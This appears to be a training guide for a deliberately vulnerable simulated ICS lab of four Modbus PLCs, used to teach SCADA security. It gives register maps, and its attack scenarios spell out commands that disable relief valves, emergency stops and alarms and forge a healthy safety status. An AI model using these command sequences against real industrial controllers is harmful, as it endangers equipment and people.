# Modbus CLI Guide for Vuln-PLC

This guide demonstrates how to interact with the Vuln-PLC environment using standard Modbus CLI commands. This syntax matches traditional Modbus tools used in SCADA/ICS/OT security training and penetration testing.

## Quick Start

### Start the PLCs
```bash
cd ~/Vuln-PLC
vuln-plc start
```

### Verify PLCs are Running
```bash
vuln-plc status
```

## Command Syntax

```bash
modbus-cli <host> <port> <command> <register_type> <address> [count|value]
```

### Parameters

- **host**: IP address or hostname (typically `localhost` for Vuln-PLC)
- **port**: Modbus TCP port number
- **command**: `read` or `write`
- **register_type**: `holding`, `input`, `coil`, or `discrete`
- **address**: Starting register/coil address (0-based)
- **count**: Number of registers/coils to read (for read commands)
- **value**: Value to write (for write commands)

## PLC Configuration

| PLC   | Port | Description                        | IP Address |
|-------|------|------------------------------------|------------|
| PLC1  | 5502 | Tank Control System                | localhost  |
| PLC2  | 5503 | Pressure Control System            | localhost  |
| PLC3  | 5504 | Temperature Control System         | localhost  |
| PLC4  | 5505 | Safety/Emergency Shutdown System   | localhost  |

## Basic Commands

### Reading Holding Registers

```bash
# Read 10 holding registers starting at address 0 from PLC1
modbus-cli localhost 5502 read holding 0 10

# Read 5 holding registers from PLC2
modbus-cli localhost 5503 read holding 0 5

# Read single holding register
modbus-cli localhost 5504 read holding 2 1
```

### Writing Holding Registers

```bash
# Write value 750 to register 0 on PLC1 (75.0% tank level)
modbus-cli localhost 5502 write holding 0 750

# Set pressure setpoint on PLC2 to 150.0 kPa
modbus-cli localhost 5503 write holding 2 1500

# Set temperature setpoint on PLC3 to 85.0°C
modbus-cli localhost 5504 write holding 2 850
```

### Reading Coils

```bash
# Read 8 coils starting at address 0 from PLC1
modbus-cli localhost 5502 read coil 0 8

# Read 4 emergency stop coils from PLC4
modbus-cli localhost 5505 read coil 0 4

# Read all coils from PLC2
modbus-cli localhost 5503 read coil 0 16
```

### Writing Coils

```bash
# Turn ON pump1 (coil 0) on PLC1
modbus-cli localhost 5502 write coil 0 1

# Turn OFF pump1 (coil 0) on PLC1
modbus-cli localhost 5502 write coil 0 0

# Activate master emergency stop on PLC4
modbus-cli localhost 5505 write coil 3 1

# Disable relief valve on PLC2
modbus-cli localhost 5503 write coil 2 0
```

## PLC Register Maps

### PLC1 - Tank Control System (Port 5502)

**Holding Registers:**
| Address | Name                   | Range      | Units      | Description                    |
|---------|------------------------|------------|------------|--------------------------------|
| 0       | tank1_level            | 0-1000     | /10 = %    | Tank 1 level                   |
| 1       | tank1_temp             | 0-1000     | /10 = °C   | Tank 1 temperature             |
| 2       | tank1_pressure         | 0-2000     | /10 = kPa  | Tank 1 pressure                |
| 3       | tank2_level            | 0-1000     | /10 = %    | Tank 2 level                   |
| 4       | tank2_temp             | 0-1000     | /10 = °C   | Tank 2 temperature             |
| 5       | flow_rate              | 0-1000     | /10 = L/min| Flow rate                      |
| 6       | inlet_valve_position   | 0-100      | %          | Inlet valve position           |
| 7       | outlet_valve_position  | 0-100      | %          | Outlet valve position          |

**Coils:**
| Address | Name               | Values     | Description                |
|---------|-------------------|------------|----------------------------|
| 0       | pump1_status       | 0=OFF, 1=ON| Pump 1 control             |
| 1       | pump2_status       | 0=OFF, 1=ON| Pump 2 control             |
| 2       | valve1_open        | 0=OFF, 1=ON| Valve 1 control            |
| 3       | valve2_open        | 0=OFF, 1=ON| Valve 2 control            |
| 4       | heater1_active     | 0=OFF, 1=ON| Heater 1 control           |
| 5       | mixer1_active      | 0=OFF, 1=ON| Mixer 1 control            |
| 10      | alarm_high_level   | 0=OFF, 1=ON| High level alarm           |
| 11      | alarm_low_level    | 0=OFF, 1=ON| Low level alarm            |

**Examples:**
```bash
# Read tank levels and temperatures
modbus-cli localhost 5502 read holding 0 5

# Set tank1 level to 80%
modbus-cli localhost 5502 write holding 0 800

# Turn on pump1
modbus-cli localhost 5502 write coil 0 1

# Check all pump and valve status
modbus-cli localhost 5502 read coil 0 6
```

### PLC2 - Pressure Control System (Port 5503)

**Holding Registers:**
| Address | Name                | Range      | Units      | Description                    |
|---------|---------------------|------------|------------|--------------------------------|
| 0       | pressure_1          | 0-2000     | /10 = kPa  | Pressure sensor 1              |
| 1       | pressure_2          | 0-2000     | /10 = kPa  | Pressure sensor 2              |
| 2       | pressure_setpoint   | 0-2000     | /10 = kPa  | Pressure setpoint              |
| 3       | flow_rate           | 0-1000     | /10 = L/min| Flow rate                      |

**Coils:**
| Address | Name                | Values     | Description                |
|---------|---------------------|------------|----------------------------|
| 0       | compressor_1_status | 0=OFF, 1=ON| Compressor 1               |
| 1       | compressor_2_status | 0=OFF, 1=ON| Compressor 2               |
| 2       | relief_valve_1      | 0=OFF, 1=ON| Relief valve 1             |
| 3       | relief_valve_2      | 0=OFF, 1=ON| Relief valve 2             |
| 4       | emergency_vent      | 0=OFF, 1=ON| Emergency vent             |

**Examples:**
```bash
# Read all pressure values
modbus-cli localhost 5503 read holding 0 4

# Set dangerous high pressure setpoint
modbus-cli localhost 5503 write holding 2 2000

# Disable relief valves (attack scenario)
modbus-cli localhost 5503 write coil 2 0
modbus-cli localhost 5503 write coil 3 0
```

### PLC3 - Temperature Control System (Port 5504)

**Holding Registers:**
| Address | Name                  | Range      | Units      | Description                    |
|---------|-----------------------|------------|------------|--------------------------------|
| 0       | temperature_1         | 0-1000     | /10 = °C   | Temperature sensor 1           |
| 1       | temperature_2         | 0-1000     | /10 = °C   | Temperature sensor 2           |
| 2       | temperature_setpoint  | 0-1000     | /10 = °C   | Temperature setpoint           |
| 3       | heater_power          | 0-100      | %          | Heater power level             |

**Coils:**
| Address | Name           | Values     | Description                |
|---------|----------------|------------|----------------------------|
| 0       | heater_1_active| 0=OFF, 1=ON| Heater 1                   |
| 1       | heater_2_active| 0=OFF, 1=ON| Heater 2                   |
| 2       | cooling_fan_1  | 0=OFF, 1=ON| Cooling fan 1              |
| 3       | cooling_fan_2  | 0=OFF, 1=ON| Cooling fan 2              |

**Examples:**
```bash
# Read temperature sensors and setpoint
modbus-cli localhost 5504 read holding 0 4

# Set extremely high temperature setpoint
modbus-cli localhost 5504 write holding 2 1000

# Force heaters on, disable cooling (attack)
modbus-cli localhost 5504 write coil 0 1
modbus-cli localhost 5504 write coil 1 1
modbus-cli localhost 5504 write coil 2 0
modbus-cli localhost 5504 write coil 3 0
```

### PLC4 - Safety/Emergency Shutdown System (Port 5505)

**Holding Registers:**
| Address | Name                   | Range      | Units      | Description                    |
|---------|------------------------|------------|------------|--------------------------------|
| 0       | emergency_stop_status  | 0-1        | Boolean    | 0=OK, 1=STOPPED                |
| 1       | alarm_count            | 0-65535    | Count      | Total alarm count              |
| 2       | system_health          | 0-100      | %          | Overall system health          |

**Coils:**
| Address | Name                    | Values     | Description                |
|---------|-------------------------|------------|----------------------------|
| 0       | emergency_stop_1        | 0=OFF, 1=ON| Emergency stop button 1    |
| 1       | emergency_stop_2        | 0=OFF, 1=ON| Emergency stop button 2    |
| 2       | emergency_stop_3        | 0=OFF, 1=ON| Emergency stop button 3    |
| 3       | master_emergency_stop   | 0=OFF, 1=ON| Master emergency stop      |
| 10      | alarm_critical          | 0=OFF, 1=ON| Critical alarm             |
| 11      | alarm_warning           | 0=OFF, 1=ON| Warning alarm              |

**Examples:**
```bash
# Read safety system status
modbus-cli localhost 5505 read holding 0 3

# Check all emergency stops
modbus-cli localhost 5505 read coil 0 4

# Disable all emergency stops (dangerous!)
modbus-cli localhost 5505 write coil 0 0
modbus-cli localhost 5505 write coil 1 0
modbus-cli localhost 5505 write coil 2 0
modbus-cli localhost 5505 write coil 3 0

# Forge healthy system status
modbus-cli localhost 5505 write holding 0 0
modbus-cli localhost 5505 write holding 2 100
```

## Attack Scenarios

### Scenario 1: Tank Overflow Attack

**Objective:** Overfill tank and disable safety alarms

```bash
# 1. Reconnaissance - Check current tank level
modbus-cli localhost 5502 read holding 0 1

# 2. Attack - Set tank to 100% (dangerous level)
modbus-cli localhost 5502 write holding 0 1000

# 3. Disable high level alarm to prevent detection
modbus-cli localhost 5502 write coil 10 0

# 4. Verify the attack
modbus-cli localhost 5502 read holding 0 1
modbus-cli localhost 5502 read coil 10 1

# Monitor via web interface: http://localhost:5000
```

### Scenario 2: Pressure Vessel Attack

**Objective:** Create dangerous overpressure condition

```bash
# 1. Read current pressure
modbus-cli localhost 5503 read holding 0 3

# 2. Set extremely high pressure setpoint (200 kPa)
modbus-cli localhost 5503 write holding 2 2000

# 3. Enable both compressors
modbus-cli localhost 5503 write coil 0 1
modbus-cli localhost 5503 write coil 1 1

# 4. Disable safety relief valves
modbus-cli localhost 5503 write coil 2 0
modbus-cli localhost 5503 write coil 3 0

# 5. Monitor pressure increase
modbus-cli localhost 5503 read holding 0 2

# Monitor via web interface: http://localhost:5011
```

### Scenario 3: Temperature Manipulation

**Objective:** Create thermal runaway condition

```bash
# 1. Check current temperature
modbus-cli localhost 5504 read holding 0 3

# 2. Set maximum temperature setpoint (100°C)
modbus-cli localhost 5504 write holding 2 1000

# 3. Force both heaters on at full power
modbus-cli localhost 5504 write coil 0 1
modbus-cli localhost 5504 write coil 1 1
modbus-cli localhost 5504 write holding 3 100

# 4. Disable all cooling systems
modbus-cli localhost 5504 write coil 2 0
modbus-cli localhost 5504 write coil 3 0

# 5. Verify heaters are running
modbus-cli localhost 5504 read coil 0 4

# Monitor via web interface: http://localhost:5012
```

### Scenario 4: Safety System Bypass

**Objective:** Disable all safety interlocks

```bash
# 1. Assess safety system status
modbus-cli localhost 5505 read holding 0 3
modbus-cli localhost 5505 read coil 0 12

# 2. Disable all emergency stop buttons
modbus-cli localhost 5505 write coil 0 0
modbus-cli localhost 5505 write coil 1 0
modbus-cli localhost 5505 write coil 2 0
modbus-cli localhost 5505 write coil 3 0

# 3. Clear all alarms
modbus-cli localhost 5505 write coil 10 0
modbus-cli localhost 5505 write coil 11 0

# 4. Forge "healthy" system status
modbus-cli localhost 5505 write holding 0 0     # Clear e-stop status
modbus-cli localhost 5505 write holding 1 0     # Reset alarm count
modbus-cli localhost 5505 write holding 2 100   # Set health to 100%

# 5. Verify safety bypass
modbus-cli localhost 5505 read holding 0 3

# Monitor via web interface: http://localhost:5013
```

### Scenario 5: Multi-Stage Attack Chain

**Objective:** Coordinate attack across multiple PLCs

```bash
# Stage 1: Disable safety system
modbus-cli localhost 5505 write coil 3 0

# Stage 2: Manipulate tank levels
modbus-cli localhost 5502 write holding 0 1000
modbus-cli localhost 5502 write holding 3 50

# Stage 3: Create pressure spike
modbus-cli localhost 5503 write holding 2 2000
modbus-cli localhost 5503 write coil 2 0

# Stage 4: Temperature attack
modbus-cli localhost 5504 write holding 2 1000
modbus-cli localhost 5504 write coil 2 0
modbus-cli localhost 5504 write coil 3 0

# Verify cascade effect across all PLCs
modbus-cli localhost 5502 read holding 0 8
modbus-cli localhost 5503 read holding 0 4
modbus-cli localhost 5504 read holding 0 4
modbus-cli localhost 5505 read holding 0 3
```

## Advanced Options

### Specify Slave/Unit ID

```bash
# Default slave ID is 1, but you can specify others
modbus-cli -s 1 localhost 5502 read holding 0 10
```

### Verbose Output

```bash
# Use -v for verbose/debug output
modbus-cli -v localhost 5502 read holding 0 5
```

### Get Help

```bash
# Display usage information
modbus-cli --help
```

## Integration with Other Tools

### Using with Metasploit

```bash
msfconsole
use auxiliary/scanner/scada/modbusclient
set RHOSTS localhost
set RPORT 5502
set DATA_ADDRESS 0
set NUMBER 10
run
```

### Using with Python (pymodbus)

```python
from pymodbus.client.sync import ModbusTcpClient

# Connect to PLC1
client = ModbusTcpClient('localhost', port=5502)
client.connect()

# Read holding registers
result = client.read_holding_registers(0, 10, unit=1)
print(result.registers)

# Write holding register
client.write_register(0, 750, unit=1)

# Read coils
coils = client.read_coils(0, 8, unit=1)
print(coils.bits)

# Write coil
client.write_coil(0, True, unit=1)

client.close()
```

### Using with Nmap

```bash
# Scan for Modbus services
nmap -p 502,5502-5505 localhost

# Use Modbus NSE scripts
nmap -p 502 --script modbus-discover localhost
```

## Troubleshooting

### PLCs Not Responding

```bash
# Check if PLCs are running
vuln-plc status

# Start PLCs if needed
vuln-plc start

# Verify ports are listening
netstat -tulpn | grep -E "5502|5503|5504|5505"

# Test connectivity
nc -zv localhost 5502
```

### Connection Refused

```bash
# Ensure Docker containers are running
docker ps | grep vuln-plc

# Check Docker logs
docker logs vuln-plc1
docker logs vuln-plc2
docker logs vuln-plc3
docker logs vuln-plc4
```

### Permission Errors

```bash
# Ensure modbus-cli is executable
chmod +x ~/.local/bin/modbus-cli

# Check if ~/.local/bin is in PATH
echo $PATH | grep -q "$HOME/.local/bin" || echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc
```

## Monitoring and Detection

### Check IDS Logs

```bash
# View IDS detection logs
docker logs vuln-plc1 | grep IDS

# Monitor live IDS alerts
docker logs -f vuln-plc1 | grep IDS
```

### View System Monitor

```bash
# Access system-wide monitoring dashboard
firefox http://localhost:5999
```

### Review Historian Data

```bash
# Access historical data
firefox http://localhost:8888
```

## Training Exercises

1. **Reconnaissance Phase**
   - Use read commands to map all register values
   - Document normal operating ranges
   - Identify critical control points

2. **Single-PLC Attacks**
   - Practice individual attacks on each PLC
   - Observe effects in web interfaces
   - Check IDS detection

3. **Multi-PLC Coordination**
   - Develop attack chains across PLCs
   - Time attacks for maximum impact
   - Avoid IDS detection

4. **Defense Practice**
   - Analyze IDS logs after attacks
   - Identify attack signatures
   - Develop detection rules

5. **Incident Response**
   - Restore systems to safe state
   - Document attack indicators
   - Create remediation procedures

## Additional Resources

- **Web Interfaces:**
  - PLC1: http://localhost:5000
  - PLC2: http://localhost:5011
  - PLC3: http://localhost:5012
  - PLC4: http://localhost:5013

- **Monitoring Dashboards:**
  - System Monitor: http://localhost:5999
  - HMI Dashboard: http://localhost:8000
  - Historian: http://localhost:8888

- **Documentation:**
  - Main README: ~/Vuln-PLC/README.md
  - Training Guide: ~/Vuln-PLC/TRAINING_GUIDE.md
  - Student Workbook: ~/Vuln-PLC/STUDENT_WORKBOOK.md

## Course Alignment

This guide is designed to align with "Hackers Arise SCADA/ICS/OT Hacking & Security" course material, using standard Modbus CLI syntax that matches industry tools and practices.

**Key Learning Objectives:**
- Understanding Modbus TCP protocol structure
- Reading and writing industrial control registers
- Identifying attack vectors in SCADA systems
- Analyzing IDS detection capabilities
- Developing secure SCADA architectures

For questions or issues, refer to the main README.md or course materials.
